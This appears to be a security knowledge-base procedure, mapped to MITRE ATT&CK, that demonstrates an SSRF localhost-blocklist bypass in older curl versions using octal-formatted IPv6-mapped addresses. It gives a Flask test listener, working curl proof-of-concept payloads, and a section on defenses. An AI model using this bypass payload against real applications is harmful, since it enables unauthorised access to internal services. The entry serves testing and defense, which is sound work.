---
id: 123e4567-e89b-12d3-a456-426614174001
tags:
  - ssrf
  - curl
  - ipv6
  - localhost-bypass
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/Flask]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-ssrf-poc-with-octal-ipv6]]'
  - '[[commands/curl-verbose-ipv6-test]]'
verified: false
platforms:
  - Linux
  - macOS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:09:00.621Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
---
id: 123e4567-e89b-12d3-a456-426614174001
name: Demonstrate-Curl-SSRF-with-Octal-IPv6
type: procedure
verified: false
submitted: false
created_at: 2023-10-01T00:00:00Z
updated_at: 2023-10-01T00:00:00Z
tactics: [[Initial Access]]
techniques: [[Exploit Public-Facing Application]]
sub_techniques: []
tags: [ssrf, curl, ipv6, localhost-bypass]
commands: [[commands/curl-ssrf-poc-with-octal-ipv6]], [[commands/curl-verbose-ipv6-test]]
platforms: [Linux, macOS]
tools: [[tools/curl]], [[tools/Flask]]
---

# Demonstrate-Curl-SSRF-with-Octal-IPv6

## Summary

This procedure exploits a parsing flaw in curl versions 8.7.1 and below, where leading zeros in octal IPv4 parts of IPv6-mapped addresses are stripped, allowing SSRF to localhost (127.0.0.1) and bypassing IP blocklists that check for localhost formats.

## Description

The vulnerability stems from curl's inconsistent handling of octal numbers in IPv4-mapped IPv6 addresses, as per RFC 4291. Addresses like ::ffff:0127.0.0.1 are parsed by stripping zeros to 127.0.0.1 without rejecting the invalid octal format, unlike pure IPv4. This enables unauthenticated attackers to perform SSRF, RFI, LFI, and potentially RCE in applications using curl for URL fetching. Platform differences (e.g., macOS accepts via libc inet_pton, Linux rejects) affect reproducibility. Prerequisites include curl <=8.7.1 and a local test server.

## Requirements

1. Curl version 8.7.1 or below installed
2. Python with Flask for local server setup
3. Local network access to bind port 80
4. Target application context where curl processes user-supplied URLs

## Defense

Defensive measures and detection strategies:

- Upgrade curl to version 8.8.0 or later, which fixes the parsing issue
- Implement strict URL validation to reject IPv6-mapped addresses with leading zeros or octal formats
- Use blocklists that normalize addresses before checking (e.g., strip zeros and compare to 127.0.0.1/::1)
- Monitor curl invocations for suspicious IPv6 literals in logs; detect via anomaly in address parsing

## Objectives

1. Demonstrate connection to localhost via malformed IPv6 to confirm SSRF
2. Highlight bypass of localhost blocklists in validators
3. Validate impact on RFI/LFI/RCE in curl-dependent services

## Instructions

### Step 1: Setup Local Test Server

**Context**: Create a listener to verify SSRF requests reach localhost.

**Command** ([[tools/Flask]]):
```python
from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello():
    return 'FindVuln'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, threaded=True)
```

> Run this Python script to start the server. It binds to all interfaces on port 80 and responds with 'FindVuln' to root requests, confirming successful SSRF.

### Step 2: Execute SSRF Payload

**Context**: Use curl to fetch from the malformed address, exploiting the parsing flaw.

**Command** ([[commands/curl-ssrf-poc-with-octal-ipv6]]):
```bash
curl http://[::ffff:0127.000.0.1]/
```

> This command parses ::ffff:0127.000.0.1 by stripping zeros to 127.0.0.1, connecting to the local server and returning 'FindVuln' on affected platforms.

### Step 3: Test with Verbose Output for Rejection Cases

**Context**: Verify behavior on platforms that reject the address.

**Command** ([[commands/curl-verbose-ipv6-test]]):
```bash
curl -g 'http://[::ffff:0127.0.0.1]/' -v -o /dev/null
```

> Disables globbing (-g), enables verbose (-v), discards body (-o /dev/null). On Linux, outputs rejection message; on macOS, may succeed.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-ssrf-poc-with-octal-ipv6]]
- [[commands/curl-verbose-ipv6-test]]

## Tools Used

- [[tools/curl]]
- [[tools/Flask]]

## Tags

- ssrf
- curl
- ipv6
- localhost-bypass
